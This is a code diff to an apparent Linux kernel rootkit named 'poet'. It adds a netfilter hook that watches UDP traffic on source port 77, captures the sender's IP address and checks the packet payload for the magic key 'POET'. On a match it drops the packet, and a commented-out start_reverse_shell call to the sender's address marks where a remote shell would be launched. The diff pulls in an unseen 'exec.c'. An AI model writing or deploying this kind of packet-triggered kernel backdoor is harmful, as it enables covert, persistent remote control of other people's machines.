@@ -1,13 +1,15 @@
+#include "exec.c"
+const char* KEY = "POET";
+
 static unsigned int my_nf_hookfn(void *priv,
               struct sk_buff *skb,
               const struct nf_hook_state *state)
 {
-      //Network headers
+    //Network headers
     struct iphdr *ip_header;        //ip header
 	struct udphdr *udp_header;
-    struct sk_buff *sock_buff = skb;//sock buffer
+    struct sk_buff *sock_buff = skb; //sock buffer
     char *user_data;       //data header pointer
-    //Auxiliar
     int size;                       //payload size
     char* _data;
     struct udphdr _udphdr;
@@ -15,12 +17,14 @@ static unsigned int my_nf_hookfn(void *priv,
     char ip_source[16];
     //char port[16];
 
-    if (!sock_buff){
+    if (!sock_buff) 
+    {
         return NF_ACCEPT; //socket buffer empty
     }
     
     ip_header = skb_header_pointer(skb, 0, sizeof(_iph), &_iph);
-    if (!ip_header){
+    if (!ip_header)
+    {
         return NF_ACCEPT;
     }
 
@@ -34,14 +38,14 @@ static unsigned int my_nf_hookfn(void *priv,
 
         sport = htons((unsigned short int) udp_header->source);
         dport = htons((unsigned short int) udp_header->dest);
-        if(sport != 77) //TODO change port
+        if(sport != 77) 
         {
             return NF_ACCEPT; //We ignore those not for port 77
         }
         printk(KERN_INFO "poet: Received packet on port 77\n");
-             
 
-        //size = htons(ip_header->tot_len) - ip_header->ihl*4 - udp_header->doff*4;
+        snprintf(ip_source, 16, "%pI4", &ip_header->saddr); // getting source address
+ 
         size = htons(ip_header->tot_len) - sizeof(_iph) - 8; // total ip header length - sizeof just ip header - sizeof udp header (8)
         _data = kmalloc(size, GFP_KERNEL);
 
@@ -56,12 +60,16 @@ static unsigned int my_nf_hookfn(void *priv,
             kfree(_data);
             return NF_ACCEPT;
         }
+        // format=POET-IP
 
         printk(KERN_DEBUG "data len : %d\ndata : \n", (int)strlen(user_data));
         printk(KERN_DEBUG "%s\n", user_data);
-
-        if(strlen(user_data)<10){
-            return NF_ACCEPT;
+        printk(KERN_INFO "%s\n", ip_source);
+        if (memcmp(user_data, KEY, strlen(KEY))==0)
+        {
+            // start_reverse_shell(ip_source, 77);
+            printk(KERN_INFO "successful compare\n");
+            return NF_DROP;
         }
 
         return NF_ACCEPT;
